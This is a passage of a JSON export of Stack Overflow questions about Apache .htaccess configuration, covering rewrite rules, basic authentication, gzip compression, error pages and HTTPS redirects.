<strong><em>(no slash at the end of the address)</em></strong> it's returning a 403 error... I have tried some codes... none of them worked for me... do anyone know the solution of my problem...??</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13232981,"title":"Dont apply rule when url starts with a specific word","body":"<p>I got this rule:</p>\n\n<pre><code>RewriteRule ^([a-z]+)/([^-]+)-([^&amp;]+)$ lala.php?type=$1&amp;id=$2&amp;title=$3 [L]\n</code></pre>\n\n<p>But I also have:</p>\n\n<pre><code>RewriteRule ^testpage/([^-]+)-([^&amp;]+)$ lala.php?type=$1&amp;id=$2&amp;title=$3 [L]\n</code></pre>\n\n<p>The first rule overwrites the second rule. Is there a possibility to say smth like: Apply the first rule when ([a-z]+) is not \"testpage\"?</p>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess","rest","basic-authentication","dreamhost"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":9695331,"title":"Restful codeignitier basic auth not working","body":"<p>I've been pulling my hair out over this for about 4 hours so I thought I would turn to the gurus.  I'm using Phil Sturgeon's fantastic Rest server and client to build a web service and everything is working great except for the basic authentication (or digest for that matter, but first things first).  I've been following along with his written tutorial and video, but at the point where he demonstrates the authorization working, it just works, whereas mine does not.  I have narrowed down the problem to Dreamhost where I have the files, and what I think is an htaccess problem.  </p>\n\n<p>I've set up a really simple test page like so:</p>\n\n<pre><code> &lt;?php\n// Split the user/pass variable\nlist($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) =explode(':' , base64_decode(substr($_SERVER['REDIRECT_REMOTE_USER'], 6)));\n\n// Open a user/pass prompt if needed\nif (!$_SERVER['PHP_AUTH_USER']) {\nheader('WWW-Authenticate: Basic realm=\"My Realm\"');\nheader('HTTP/1.0 401 Unauthorized');\necho 'You cannot see this, sorry.'; \nexit;\n} else {\necho \"&lt;p&gt;Hello, &lt;/p&gt;\".$_SERVER['PHP_AUTH_USER'];\necho \"&lt;p&gt;You entered as your password: &lt;/p&gt;\".$_SERVER['PHP_AUTH_PW'];\n}\n\n\n?&gt;\n</code></pre>\n\n<p>Even in this very basic example I can't catch the variables that I enter into the popup. \nthis is my htaccess:</p>\n\n<pre><code># Various rewrite rules.\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ dispatch.fcgi [E=REMOTE_USER:%{HTTP:Authorization},QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>to be honest, I don't understand the htaccess stuff and its a copy paste from someone solving a similar problem, but its just not working.  Also relevant to my issue, I'm using php 5.2 with fast cgi. </p>\n\n<p>can anyone clear the fog? My goal is to have the username and password passed to the php file, I can extrapolate the rest to fit it into my rest api solution. </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2438,"score":0,"question_id":5294144,"title":"How to have multiple rewriterules with .htaccess?","body":"<p>I am trying to build a multilingual website with Drupal.</p>\n\n<p>I like to have the following url format</p>\n\n<p><code>http://domain/[language]/[node id]</code></p>\n\n<p>so I added the following rule to .htaccess for testing purpose</p>\n\n<p><code>RewriteRule ^jpn/[0-9]$ jpn.html</code></p>\n\n<p>The problem is that the rule is overwritten by the following rule</p>\n\n<p><code>RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]</code></p>\n\n<p>How do I have multiple rewrite rules?</p>\n"},{"tags":["css",".htaccess","compression","less"],"answer_count":2,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":227,"score":6,"question_id":12314617,"title":"Is it possible to compress LESS CSS files with htaccess? (and how to?)","body":"<p>I'm using less css in my project, and YSlow is telling me that my .less files are nod GZip compressed.</p>\n\n<p>All my other files (js, html, and event CSS files if I include some...) are well encoded, but not LESS files.</p>\n\n<p>Here is my .htaccess :</p>\n\n<pre><code># Apache configuration file\n# httpd.apache.org/docs/2.2/mod/quickreference.html\n\n# Note .htaccess files are an overhead, this logic should be in your Apache config if possible\n# httpd.apache.org/docs/2.2/howto/htaccess.html\n\n# Techniques in here adapted from all over, including:\n#   Kroc Camen: camendesign.com/.htaccess\n#   perishablepress.com/press/2006/01/10/stupid-htaccess-tricks/\n#   Sample .htaccess file of CMS MODx: modxcms.com\n\n\n###\n### If you run a webserver other than Apache, consider:\n### github.com/h5bp/server-configs\n###\n\n\n\n# ----------------------------------------------------------------------\n# Better website experience for IE users\n# ----------------------------------------------------------------------\n\n# Force the latest IE version, in various cases when it may fall back to IE7 mode\n#  github.com/rails/rails/commit/123eb25#commitcomment-118920\n# Use ChromeFrame if it's installed for a better experience for the poor IE folk\n\n&lt;IfModule mod_headers.c&gt;\n  Header set X-UA-Compatible \"IE=Edge,chrome=1\"\n  # mod_headers can't match by content-type, but we don't want to send this header on *everything*...\n  &lt;FilesMatch \"\\.(js|css|less|gif|png|jpe?g|pdf|xml|oga|ogg|m4a|ogv|mp4|m4v|webm|svg|svgz|eot|ttf|otf|woff|ico|webp|appcache|manifest|htc|crx|oex|xpi|safariextz|vcf)$\" &gt;\n    Header unset X-UA-Compatible\n  &lt;/FilesMatch&gt;\n&lt;/IfModule&gt;\n\n\n# ----------------------------------------------------------------------\n# Cross-domain AJAX requests\n# ----------------------------------------------------------------------\n\n# Serve cross-domain Ajax requests, disabled by default.\n# enable-cors.org\n# code.google.com/p/html5security/wiki/CrossOriginRequestSecurity\n\n#  &lt;IfModule mod_headers.c&gt;\n#    Header set Access-Control-Allow-Origin \"*\"\n#  &lt;/IfModule&gt;\n\n\n# ----------------------------------------------------------------------\n# CORS-enabled images (@crossorigin)\n# ----------------------------------------------------------------------\n\n# Send CORS headers if browsers request them; enabled by default for images.\n# developer.mozilla.org/en/CORS_Enabled_Image\n# blog.chromium.org/2011/07/using-cross-domain-images-in-webgl-and.html\n# hacks.mozilla.org/2011/11/using-cors-to-load-webgl-textures-from-cross-domain-images/\n# wiki.mozilla.org/Security/Reviews/crossoriginAttribute\n\n&lt;IfModule mod_setenvif.c&gt;\n  &lt;IfModule mod_headers.c&gt;\n    # mod_headers, y u no match by Content-Type?!\n    &lt;FilesMatch \"\\.(gif|png|jpe?g|svg|svgz|ico|webp)$\"&gt;\n      SetEnvIf Origin \":\" IS_CORS\n      Header set Access-Control-Allow-Origin \"*\" env=IS_CORS\n    &lt;/FilesMatch&gt;\n  &lt;/IfModule&gt;\n&lt;/IfModule&gt;\n\n\n# ----------------------------------------------------------------------\n# Webfont access\n# ----------------------------------------------------------------------\n\n# Allow access from all domains for webfonts.\n# Alternatively you could only whitelist your\n# subdomains like \"subdomain.example.com\".\n\n&lt;IfModule mod_headers.c&gt;\n  &lt;FilesMatch \"\\.(ttf|ttc|otf|eot|woff|font.css)$\"&gt;\n    Header set Access-Control-Allow-Origin \"*\"\n  &lt;/FilesMatch&gt;\n&lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# Proper MIME type for all files\n# ----------------------------------------------------------------------\n\n\n# CSS\nAddType text/css         css less\n\n# JavaScript\n#   Normalize to standard type (it's sniffed in IE anyways)\n#   tools.ietf.org/html/rfc4329#section-7.2\nAddType application/javascript         js\n\n# Audio\nAddType audio/ogg                      oga ogg\nAddType audio/mp4                      m4a\n\n# Video\nAddType video/ogg                      ogv\nAddType video/mp4                      mp4 m4v\nAddType video/webm                     webm\n\n# SVG\n#   Required for svg webfonts on iPad\n#   twitter.com/FontSquirrel/status/14855840545\nAddType     image/svg+xml              svg svgz\nAddEncoding gzip                       svgz\n\n# Webfonts\nAddType application/vnd.ms-fontobject  eot\nAddType application/x-font-ttf         ttf ttc\nAddType font/opentype                  otf\nAddType application/x-font-woff        woff\n\n# Assorted types\nAddType image/x-icon                        ico\nAddType image/webp                          webp\nAddType text/cache-manifest                 appcache manifest\nAddType text/x-component                    htc\nAddType application/x-chrome-extension      crx\nAddType application/x-opera-extension       oex\nAddType application/x-xpinstall             xpi\nAddType application/octet-stream            safariextz\nAddType application/x-web-app-manifest+json webapp\nAddType text/x-vcard                        vcf\n\n\n\n# ----------------------------------------------------------------------\n# Allow concatenation from within specific js and css files\n# ----------------------------------------------------------------------\n\n# e.g. Inside of script.combined.js you could have\n#   &lt;!--#include file=\"libs/jquery-1.5.0.min.js\" --&gt;\n#   &lt;!--#include file=\"plugins/jquery.idletimer.js\" --&gt;\n# and they would be included into this single file.\n\n# This is not in use in the boilerplate as it stands. You may\n# choose to name your files in this way for this advantage or\n# concatenate and minify them manually.\n# Disabled by default.\n\n#&lt;FilesMatch \"\\.combined\\.js$\"&gt;\n#  Options +Includes\n#  AddOutputFilterByType INCLUDES application/javascript application/json\n#  SetOutputFilter INCLUDES\n#&lt;/FilesMatch&gt;\n#&lt;FilesMatch \"\\.combined\\.css$\"&gt;\n#  Options +Includes\n#  AddOutputFilterByType INCLUDES text/css\n#  SetOutputFilter INCLUDES\n#&lt;/FilesMatch&gt;\n\n\n# ----------------------------------------------------------------------\n# Gzip compression\n# ----------------------------------------------------------------------\n\n&lt;IfModule mod_deflate.c&gt;\n\n  # Force deflate for mangled headers developer.yahoo.com/blogs/ydn/posts/2010/12/pushing-beyond-gzipping/\n  &lt;IfModule mod_setenvif.c&gt;\n    &lt;IfModule mod_headers.c&gt;\n      SetEnvIfNoCase ^(Accept-EncodXng|X-cept-Encoding|X{15}|~{15}|-{15})$ ^((gzip|deflate)\\s*,?\\s*)+|[X~-]{4,13}$ HAVE_Accept-Encoding\n      RequestHeader append Accept-Encoding \"gzip,deflate\" env=HAVE_Accept-Encoding\n    &lt;/IfModule&gt;\n  &lt;/IfModule&gt;\n\n  # HTML, TXT, CSS, JavaScript, JSON, XML, HTC:\n  &lt;IfModule filter_module&gt;\n    FilterDeclare   COMPRESS\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/html\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/css\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/plain\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $text/x-component\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/javascript\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/json\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/xhtml+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/rss+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/atom+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/vnd.ms-fontobject\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $image/svg+xml\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $image/x-icon\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $application/x-font-ttf\n    FilterProvider  COMPRESS  DEFLATE resp=Content-Type $font/opentype\n    FilterChain     COMPRESS\n    FilterProtocol  COMPRESS  DEFLATE change=yes;byteranges=no\n  &lt;/IfModule&gt;\n\n  &lt;IfModule !mod_filter.c&gt;\n    # Legacy versions of Apache\n    AddOutputFilterByType DEFLATE text/html text/plain text/css application/json\n    AddOutputFilterByType DEFLATE application/javascript\n    AddOutputFilterByType DEFLATE text/xml application/xml text/x-component\n    AddOutputFilterByType DEFLATE application/xhtml+xml application/rss+xml application/atom+xml\n    AddOutputFilterByType DEFLATE image/x-icon image/svg+xml application/vnd.ms-fontobject application/x-font-ttf font/opentype\n  &lt;/IfModule&gt;\n\n&lt;/IfModule&gt;\n\n\n# ----------------------------------------------------------------------\n# Expires headers (for better cache control)\n# ----------------------------------------------------------------------\n\n# These are pretty far-future expires headers.\n# They assume you control versioning with cachebusting query params like\n#   &lt;script src=\"application.js?20100608\"&gt;\n# Additionally, consider that outdated proxies may miscache\n#   www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/\n\n# If you don't use filenames to version, lower the CSS  and JS to something like\n#   \"access plus 1 week\" or so.\n\n&lt;IfModule mod_expires.c&gt;\n  ExpiresActive on\n\n# Perhaps better to whitelist expires rules? Perhaps.\n  ExpiresDefault                          \"access plus 1 month\"\n\n# cache.appcache needs re-requests in FF 3.6 (thanks Remy ~Introducing HTML5)\n  ExpiresByType text/cache-manifest       \"access plus 0 seconds\"\n\n# Your document html\n  ExpiresByType text/html                 \"access plus 0 seconds\"\n\n# Data\n  ExpiresByType text/xml                  \"access plus 0 seconds\"\n  ExpiresByType application/xml           \"access plus 0 seconds\"\n  ExpiresByType application/json          \"access plus 0 seconds\"\n\n# Feed\n  ExpiresByType application/rss+xml       \"access plus 1 hour\"\n  ExpiresByType application/atom+xml      \"access plus 1 hour\"\n\n# Favicon (cannot be renamed)\n  ExpiresByType image/x-icon              \"access plus 1 week\"\n\n# Media: images, video, audio\n  ExpiresByType image/gif                 \"access plus 1 month\"\n  ExpiresByType image/png                 \"access plus 1 month\"\n  ExpiresByType image/jpg                 \"access plus 1 month\"\n  ExpiresByType image/jpeg                \"access plus 1 month\"\n  ExpiresByType video/ogg                 \"access plus 1 month\"\n  ExpiresByType audio/ogg                 \"access plus 1 month\"\n  ExpiresByType video/mp4                 \"access plus 1 month\"\n  ExpiresByType video/webm                \"access plus 1 month\"\n\n# HTC files  (css3pie)\n  ExpiresByType text/x-component          \"access plus 1 month\"\n\n# Webfonts\n  ExpiresByType application/x-font-ttf    \"access plus 1 month\"\n  ExpiresByType font/opentype             \"access plus 1 month\"\n  ExpiresByType application/x-font-woff   \"access plus 1 month\"\n  ExpiresByType image/svg+xml             \"access plus 1 month\"\n  ExpiresByType application/vnd.ms-fontobject \"access plus 1 month\"\n\n# CSS and JavaScript\n  ExpiresByType text/css                  \"access plus 1 year\"\n  ExpiresByType application/javascript    \"access plus 1 year\"\n\n&lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# ETag removal\n# ----------------------------------------------------------------------\n\n# FileETag None is not enough for every server.\n&lt;IfModule mod_headers.c&gt;\n  Header unset ETag\n&lt;/IfModule&gt;\n\n# Since we're sending far-future expires, we don't need ETags for\n# static content.\n#   developer.yahoo.com/performance/rules.html#etags\nFileETag None\n\n\n\n# ----------------------------------------------------------------------\n# Stop screen flicker in IE on CSS rollovers\n# ----------------------------------------------------------------------\n\n# The following directives stop screen flicker in IE on CSS rollovers - in\n# combination with the \"ExpiresByType\" rules for images (see above). If\n# needed, un-comment the following rules.\n\nBrowserMatch \"MSIE\" brokenvary=1\nBrowserMatch \"Mozilla/4.[0-9]{2}\" brokenvary=1\nBrowserMatch \"Opera\" !brokenvary\nSetEnvIf brokenvary 1 force-no-vary\n\n\n\n# ----------------------------------------------------------------------\n# Cookie setting from iframes\n# ----------------------------------------------------------------------\n\n# Allow cookies to be set from iframes (for IE only)\n# If needed, uncomment and specify a path or regex in the Location directive\n\n# &lt;IfModule mod_headers.c&gt;\n#   &lt;Location /&gt;\n#     Header set P3P \"policyref=\\\"/w3c/p3p.xml\\\", CP=\\\"IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\\\"\"\n#   &lt;/Location&gt;\n# &lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# Start rewrite engine\n# ----------------------------------------------------------------------\n\n# Turning on the rewrite engine is necessary for the following rules and features.\n# FollowSymLinks must be enabled for this to work.\n\n&lt;IfModule mod_rewrite.c&gt;\n  Options +FollowSymlinks\n  RewriteEngine On\n&lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# Suppress or force the \"www.\" at the beginning of URLs\n# ----------------------------------------------------------------------\n\n# The same content should never be available under two different URLs - especially not with and\n# without \"www.\" at the beginning, since this can cause SEO problems (duplicate content).\n# That's why you should choose one of the alternatives and redirect the other one.\n\n# By default option 1 (no \"www.\") is activated. Remember: Shorter URLs are sexier.\n# no-www.org/faq.php?q=class_b\n\n# If you rather want to use option 2, just comment out all option 1 lines\n# and uncomment option 2.\n# IMPORTANT: NEVER USE BOTH RULES AT THE SAME TIME!\n\n# ----------------------------------------------------------------------\n\n# Option 1:\n# Rewrite \"www.example.com -&gt; example.com\"\n\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteCond %{HTTPS} !=on\n  RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\n  RewriteRule ^ http://%1%{REQUEST_URI} [R=301,L]\n&lt;/IfModule&gt;\n\n# ----------------------------------------------------------------------\n\n# Option 2:\n# To rewrite \"example.com -&gt; www.example.com\" uncomment the following lines.\n# Be aware that the following rule might not be a good idea if you\n# use \"real\" subdomains for certain parts of your website.\n\n# &lt;IfModule mod_rewrite.c&gt;\n#   RewriteCond %{HTTPS} !=on\n#   RewriteCond %{HTTP_HOST} !^www\\..+$ [NC]\n#   RewriteRule ^ http://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n# &lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# Built-in filename-based cache busting\n# ----------------------------------------------------------------------\n\n# If you're not using the build script to manage your filename version revving,\n# you might want to consider enabling this, which will route requests for\n# /css/style.20110203.css to /css/style.css\n\n# To understand why this is important and a better idea than all.css?v1231,\n# read: github.com/h5bp/html5-boilerplate/wiki/Version-Control-with-Cachebusting\n\n# Uncomment to enable.\n# &lt;IfModule mod_rewrite.c&gt;\n#   RewriteCond %{REQUEST_FILENAME} !-f\n#   RewriteCond %{REQUEST_FILENAME} !-d\n#   RewriteRule ^(.+)\\.(\\d+)\\.(js|css|png|jpg|gif)$ $1.$3 [L]\n# &lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# Prevent SSL cert warnings\n# ----------------------------------------------------------------------\n\n# Rewrite secure requests properly to prevent SSL cert warnings, e.g. prevent\n# https://www.example.com when your cert only allows https://secure.example.com\n# Uncomment the following lines to use this feature.\n\n# &lt;IfModule mod_rewrite.c&gt;\n#   RewriteCond %{SERVER_PORT} !^443\n#   RewriteRule ^ https://example-domain-please-change-me.com%{REQUEST_URI} [R=301,L]\n# &lt;/IfModule&gt;\n\n\n\n# ----------------------------------------------------------------------\n# Prevent 404 errors for non-existing redirected folders\n# ----------------------------------------------------------------------\n\n# without -MultiViews, Apache will give a 404 for a rewrite if a folder of the same name does not exist\n#   e.g. /blog/hello : webmasterworld.com/apache/3808792.htm\n\nOptions -MultiViews\n\n\n\n# ----------------------------------------------------------------------\n# Custom 404 page\n# ----------------------------------------------------------------------\n\n# You can add custom pages to handle 500 or 403 pretty easily, if you like.\nErrorDocument 404 /404.html\n\n\n\n# ----------------------------------------------------------------------\n# UTF-8 encoding\n# ----------------------------------------------------------------------\n\n# Use UTF-8 encoding for anything served text/plain or text/html\nAddDefaultCharset utf-8\n\n# Force UTF-8 for a number of file formats\nAddCharset utf-8 .css .less .js .xml .json .rss .atom\n\n\n\n# ----------------------------------------------------------------------\n# A little more security\n# ----------------------------------------------------------------------\n\n\n# Do we want to advertise the exact version number of Apache we're running?\n# Probably not.\n## This can only be enabled if used in httpd.conf - It will not work in .htaccess\n# ServerTokens Prod\n\n\n# \"-Indexes\" will have Apache block users from browsing folders without a default document\n# Usually you should leave this activated, because you shouldn't allow everybody to surf through\n# every folder on your server (which includes rather private places like CMS system folders).\n&lt;IfModule mod_autoindex.c&gt;\n  Options -Indexes\n&lt;/IfModule&gt;\n\n\n# Block access to \"hidden\" directories whose names begin with a period. This\n# includes directories used by version control systems such as Subversion or Git.\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteCond %{SCRIPT_FILENAME} -d\n  RewriteCond %{SCRIPT_FILENAME} -f\n  RewriteRule \"(^|/)\\.\" - [F]\n&lt;/IfModule&gt;\n\n\n# Block access to backup and source files\n# This files may be left by some text/html editors and\n# pose a great security danger, when someone can access them\n&lt;FilesMatch \"(\\.(bak|config|sql|fla|psd|ini|log|sh|inc|swp|dist)|~)$\"&gt;\n  Order allow,deny\n  Deny from all\n  Satisfy All\n&lt;/FilesMatch&gt;\n\n\n# If your server is not already configured as such, the following directive\n# should be uncommented in order to set PHP's register_globals option to OFF.\n# This closes a major security hole that is abused by most XSS (cross-site\n# scripting) attacks. For more information: http://php.net/register_globals\n#\n# IF REGISTER_GLOBALS DIRECTIVE CAUSES 500 INTERNAL SERVER ERRORS :\n#\n# Your server does not allow PHP directives to be set via .htaccess. In that\n# case you must make this change in your php.ini file instead. If you are\n# using a commercial web host, contact the administrators for assistance in\n# doing this. Not all servers allow local php.ini files, and they should\n# include all PHP configurations (not just this one), or you will effectively\n# reset everything to PHP defaults. Consult www.php.net for more detailed\n# information about setting PHP directives.\n\nphp_flag register_globals Off\n\n# Rename session cookie to something else, than PHPSESSID\nphp_value session.name sid\n\n# Do not show you are using PHP\n# Note: Move this line to php.ini since it won't work in .htaccess\nphp_flag expose_php Off\n\n# Level of log detail - log all errors\nphp_value error_reporting -1\n\n# Write errors to log file\nphp_flag log_errors On\n\n# Do not display errors in browser (production - Off, development - On)\nphp_flag display_errors On\n\n# Do not display startup errors (production - Off, development - On)\nphp_flag display_startup_errors On\n\n# Format errors in plain text\n# Note: Leave this setting 'On' for xdebug's var_dump() output\nphp_flag html_errors On\n\n# Show multiple occurrence of error\nphp_flag ignore_repeated_errors Off\n\n# Show same errors from different sources\nphp_flag ignore_repeated_source Off\n\n# Size limit for error messages\nphp_value log_errors_max_len 1024\n\n# Don't precede error with string (doesn't accept empty string, use whitespace if you need)\nphp_value error_prepend_string \" \"\n\n# Don't prepend to error (doesn't accept empty string, use whitespace if you need)\nphp_value error_append_string \" \"\n\n# Increase cookie security\n&lt;IfModule php5_module&gt;\n  php_value session.cookie_httponly true\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteCond %{REQUEST_FILENAME} -s [OR]\n    RewriteCond %{REQUEST_FILENAME} -l [OR]\n    RewriteCond %{REQUEST_FILENAME} -d\n    RewriteRule ^.*$ - [NC,L]\n    RewriteRule ^.*$ index.php [NC,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Thanks for your help! </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":260,"score":0,"question_id":4343124,"title":"How to make my url looks cool with htaccess","body":"<p>regulars question :P</p>\n\n<p>Current URL</p>\n\n<pre><code>http://domain.com/index.php\nhttp://domain.com/index.php?page=submit-hosting\nhttp://domain.com/index.php?page=popular-hosting\n</code></pre>\n\n<p>How write my <code>.htaccess</code> to make current URL to be like this</p>\n\n<ol>\n<li><p>When user type <code>http://domain.com/index.php</code> url will return to <code>http://domain.com/</code> only without <code>index.php</code></p></li>\n<li><p>And page with<code>$_GET['page']</code> to be <code>http://domain.com/submit-hosting/</code> </p></li>\n</ol>\n\n<p>Let me know :)</p>\n"},{"tags":[".htaccess","redirect","error-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13250053,"title":".htaccess doesn't redirect to error page","body":"<p>I want my page to redirect to custom error 500 page. However, when I specify the page I want to be redirected to, the plain old 500 error page appears, and not mine.</p>\n\n<p>I'm using this line to do it</p>\n\n<pre><code>ErrorDocument 500 /errors/error500.html\n</code></pre>\n\n<p>However if I specify HTML instead of the link, it works</p>\n\n<pre><code>ErrorDocument 500 '&lt;div style=\"width:200px; margin:0 auto; text-align:center\"&gt;Oooppss &lt;br&gt;&lt;/div&gt;'\n</code></pre>\n\n<p>What am I doing wrong??</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13242062,"title":"Dynamic subdomain rewrite htaccess","body":"<p>First of all - I've read a lot of similar questions but nothing worked for me.</p>\n\n<p>These are the rewrite rules:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^([^/.]+)\\.example\\.com$ \nRewriteRule ^ index.php?user=%1 [L]\n</code></pre>\n\n<p>It works fine but it's not exactly what I want. I'm running a MVC framework like kohana where the url structure looks like this:</p>\n\n<pre><code>example.com/controller/action/parameter\n</code></pre>\n\n<p>but when I try the following rewrite I'm getting an internal server error:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^([^/.]+)\\.example\\.com$ \nRewriteRule ^ index.php/user/view/%1 [L]\n</code></pre>\n\n<p>So, how can I fix this?</p>\n"}]}
{"total":14527,"page":2,"pagesize":100,"questions":[{"tags":["php",".htaccess","authentication","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13237601,"title":"htaccess: RewriteEngine On and AuthUserFile conflict","body":"<p>Let's consider the folder www.mydomain.com/exemple protected with the following .htaccess:</p>\n\n<p>.htaccess</p>\n\n<pre><code>AuthUserFile /root/FTPname/www/.htpasswd\nAuthGroupFile /dev/null\nAuthName \"Restricted Access\"\nAuthType Basic\nrequire valid-user\n</code></pre>\n\n<p>I want to allow the access to the exemple folder only if a user has a specific cookie, or I raise an error (with the following [F] flag). Then I implemented the following code:</p>\n\n<p>.htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_COOKIE} !CookieName=CookieValue\nRewriteRule .* - [F,L]\n\nAuthUserFile /root/FTPname/www/.htpasswd\nAuthGroupFile /dev/null\nAuthName \"Restricted Access\"\nAuthType Basic\nrequire valid-user\n</code></pre>\n\n<p>The problem is that when i load the exemple folder without the cookie, it goes through the authentification process first...I would like to do raise the error first. Anyone knows?</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":26,"score":2,"question_id":13243457,"title":"htaccess rewrite regex rule - insert dash and period in query string","body":"<p>I can't seem to figure out this specific regex htaccess rewrite, and could use some assistance.  I'm trying to go from this:</p>\n\n<blockquote>\n  <p>mysite.com/product/13202102/any-random-product-name</p>\n</blockquote>\n\n<p>and rewrite to this url:</p>\n\n<blockquote>\n  <p>mysite.com/product.php?id=13-2021.02</p>\n</blockquote>\n\n<p>Note that the id will always have exactly 8 numbers, and will always require a dash (-) after the first 2 digits, and a period (.) before the last 2 digits.  The tailing string is irrelevant, but I'd like the url to work with or without a trailing slash (/).</p>\n"},{"tags":[".htaccess","redirect","http-status-code-404","default","not-exists"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13246845,"title":"htaccess redirect exits specific file","body":"<p>I store file like this\n<br>products/back.jpg\n<br>products/thumbnail.jpg\n<br>\n<br>products/items/1/back.jpg\n<br>products/items/1/thumbnail.jpg\n<br>\n<br>products/items/2/back.jpg\n<br>products/items/2/thumbnail.jpg\n<br>\n<br>products/items/.../back.jpg\n<br>products/items/.../thumbnail.jpg</p>\n\n<p>how to write htaccess with condition\nif file not found redirect to root folder (products/)\nbut user see in old path name as same as they request?</p>\n"},{"tags":["apache",".htaccess","website","cpanel"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13232432,"title":"Protected directory issue on web server","body":"<p>When I setup a password protected directory in cpanel for my website, if I use <em>www.example.com/protected</em> it correctly prompts for a username and password but if I use <em>example.com/protected</em> it lets me access the proctected area.</p>\n\n<p>The main site .htaccess is: </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nOptions -MultiViews\nRewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} .*\\.(jpeg|jpg|gif|png)$\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /public/404.php [L]\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Can anyone point me in the right direction to fix this please?</p>\n\n<p>Many Thanks</p>\n\n<p>Jim</p>\n"},{"tags":[".htaccess","mod-rewrite","ssl","https"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":3345,"score":2,"question_id":2357455,"title":"Rewrite http to https on some pages only using .htaccess","body":"<p>I know there is lots of topics regarding my question. I checked them all and tried them out but can't make it work. \nI need to rewrite http to https on some pages only. After visiting https pages the URL would go back to http. \nThis is what I have so far:</p>\n\n<pre><code>\n# Rewrite Rules for domain.com\nRewriteEngine On\nRewriteBase /\n\n#Rewrite www to domain.com\nRewriteCond %{HTTP_HOST} ^www\\.domain\\.com [NC]\nRewriteRule ^(.*)$ http://domain.com/$1 [L,R=301]\n\n#Rewrite to https\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /secure.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n\n#traffic to http://, except secure.php\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /secure.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>When I skip the last set of rules (traffic to http://, except secure.php) the secure.php page loads as https and is encrypted. FINE. With the last set of rules (traffic to http://, except secure.php) the URL rewrites to https, turns blue (SSL) for a second and disappears (no SSL) but the URL is still https.</p>\n\n<p>Any idea?\nJacek</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13242456,"title":"How do I use .htaccess rewrite to a cache subdirectory using the first letter of the request?","body":"<p>I have a caching program that creates static html files of dynamically generated php files. I currently use php to check if the cached version exists, if it does I serve 